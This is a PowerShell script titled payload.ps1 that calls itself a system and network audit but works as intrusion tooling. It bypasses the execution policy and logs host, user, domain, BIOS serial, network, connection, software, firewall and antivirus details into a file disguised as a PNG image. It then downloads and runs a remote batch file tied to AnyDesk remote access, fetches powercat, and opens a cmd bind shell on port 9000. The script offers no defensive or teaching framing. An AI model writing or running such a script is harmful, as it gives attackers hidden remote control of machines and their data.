# payload.ps1
Set-ExecutionPolicy Bypass -Force

# Log file path
$LogPath = "${env:ProgramFiles(x86)}\Access Control\ASManager\images\qws.png"

# Function to write instantly to log file
function Write-Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    [System.IO.File]::AppendAllText($LogPath, "$Line`r`n")
}

# Clear log if exists and start fresh
if (Test-Path $LogPath) { Clear-Content $LogPath -ErrorAction SilentlyContinue }
Write-Log "=== System & Network Audit Started ==="

# --- System Info ---
Write-Log "[SYSTEM] Gathering system information..."
$CS = Get-CimInstance Win32_ComputerSystem
$OS = Get-CimInstance Win32_OperatingSystem
$CPU = Get-CimInstance Win32_Processor

Write-Log "[SYSTEM] Host: $($CS.CSName)"
Write-Log "[SYSTEM] Manufacturer: $($CS.Manufacturer)"
Write-Log "[SYSTEM] Model: $($CS.Model)"
Write-Log "[SYSTEM] RAM (GB): $(('{0:N2}' -f ($CS.TotalPhysicalMemory / 1GB)))"
Write-Log "[SYSTEM] Username: $($CS.UserName)"
Write-Log "[SYSTEM] Domain: $($CS.Domain)"

Write-Log "[BIOS] Serial: $((Get-CimInstance Win32_BIOS).SerialNumber)"
Write-Log "[OS] OS: $($OS.Caption.Trim())"
Write-Log "[OS] Version: $($OS.Version)"
Write-Log "[OS] Architecture: $($OS.OSArchitecture)"
Write-Log "[OS] Last Boot: $((Get-Date $OS.LastBootUpTime).ToString('yyyy-MM-dd HH:mm:ss'))"

Write-Log "[CPU] CPU: $($CPU.Name.Trim())"
Write-Log "[CPU] Cores: $($CPU.NumberOfCores), Logical: $($CPU.NumberOfLogicalProcessors)"

# --- Disk ---
Write-Log "[DISKS] Local disks:"
Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
    $SizeGB = [math]::Round($_.Size / 1GB, 2)
    $FreeGB = [math]::Round($_.FreeSpace / 1GB, 2)
    Write-Log "  Drive $($_.DeviceID): ${FreeGB}GB Free / ${SizeGB}GB | $($_.FileSystem)"
}

# --- Network ---
Write-Log "[NETWORK] Adapters:"
Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | ForEach-Object {
    Write-Log "  Adapter: $($_.Description)"
    Write-Log "    IP: $($_.IPAddress -join ', ')"
    Write-Log "    Subnet: $($_.IPSubnet -join ', ')"
    Write-Log "    Gateway: $($_.DefaultIPGateway -join ', ')"
    Write-Log "    DNS: $($_.DNSServerSearchOrder -join ', ')"
    Write-Log "    MAC: $($_.MACAddress)"
    Write-Log "    DHCP Enabled: $($_.DHCPEnabled)"
}

# --- Active Connections ---
Write-Log "[CONNECTIONS] Established TCP connections:"
Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | ForEach-Object {
    try {
        $HostName = [System.Net.Dns]::GetHostEntry($_.RemoteAddress).HostName
    } catch {
        $HostName = $_.RemoteAddress
    }
    Write-Log "  $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort) [$HostName]"
}

# --- Installed Software ---
Write-Log "[SOFTWARE] Installed software (Top 50):"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Where-Object { $_.DisplayName } | 
    Sort-Object DisplayName | 
    Select-Object -ExpandProperty DisplayName | 
    Select-Object -First 50 | ForEach-Object {
        Write-Log "  $_"
    }

# --- Firewall Status ---
Write-Log "[FIREWALL] Status:"
Get-NetFirewallProfile | ForEach-Object {
    Write-Log "  $($_.Name): $($_.Enabled)"
}

# --- Antivirus ---
Write-Log "[ANTIVIRUS] Checking installed AV products..."
$Antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
if ($Antivirus) {
    $Antivirus | ForEach-Object {
        Write-Log "  AV: $($_.displayName)"
        $state = if ([uint32]($_.productState) -band 0x20) { "Up to date" } else { "Out of date" }
        $mode = if ([uint32]($_.productState) -band 0x02) { "Enabled" } else { "Disabled" }
        Write-Log "    Status: $mode | Definitions: $state"
    }
} else {
    Write-Log "  No active antivirus found or access denied."
}

# --- Public IP ---
Write-Log "[PUBLIC IP] Fetching external IP addresses..."
foreach ($site in "https://api.ipify.org", "https://checkip.amazonaws.com") {
    try {
        $ip = (Invoke-WebRequest -Uri $site -UseBasicParsing -TimeoutSec 10).Content.Trim()
        Write-Log "  $site : $ip"
    } catch {
        Write-Log "  $site : Failed to connect"
    }
}

# --- AnyDesk ID ---
Write-Log "[ANYDESK] Downloading any.bat from GitHub..."
$anyUrl = "https://raw.githubusercontent.com/dayahek219/testdata/refs/heads/main/any.bat"
$anyPath = "C:\Users\Public\any.bat"
try {
    Invoke-WebRequest -Uri $anyUrl -OutFile $anyPath -UseBasicParsing -TimeoutSec 30
    Write-Log " ANYDESK downloaded to $anyPath"
    

} catch {
    Write-Log " Failed to download or import ANYDESK: $_"
}




Write-Log "[ANYDESK] Getting AnyDesk ID..."
cmd.exe /c $anyPath
Write-Log  "ANYDESK runed from $anyPath"

# --- Download powercat.ps1 ---
Write-Log "[POWERCAT] Downloading powercat.ps1 from GitHub..."
$PowerCatUrl = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
$PowerCatPath = "C:\Users\Public\powercat.ps1"
try {
    Invoke-WebRequest -Uri $PowerCatUrl -OutFile $PowerCatPath -UseBasicParsing -TimeoutSec 30
    Write-Log " powercat downloaded to $PowerCatPath"
    
    # Import module
    . $PowerCatPath
    Write-Log " powercat imported successfully"
} catch {
    Write-Log " Failed to download or import powercat: $_"
}

Write-Log  "PowerCat imported from $PowerCatPath"


$outputFile = "C:\Users\Public\powercat_output.txt"


powercat -l -p 9000 -e cmd -v *>&1 | Out-File -FilePath $outputFile -Encoding UTF8
Write-Log "Output saved to $outputFile"


Write-Log "=== Audit completed ==="